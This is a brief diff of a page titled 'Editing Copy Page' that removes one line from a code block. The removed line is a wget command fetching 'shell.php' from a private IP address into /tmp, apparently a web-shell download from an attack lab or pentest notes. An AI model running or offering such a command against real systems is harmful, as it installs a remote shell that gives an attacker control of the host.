@@ -1,7 +1,7 @@
 [[Editing Copy Page]]
 
 ```
-wget http://192.168.45.248:50080/shell.php -O /tmp/shell.php
+
 ```
 
 ```
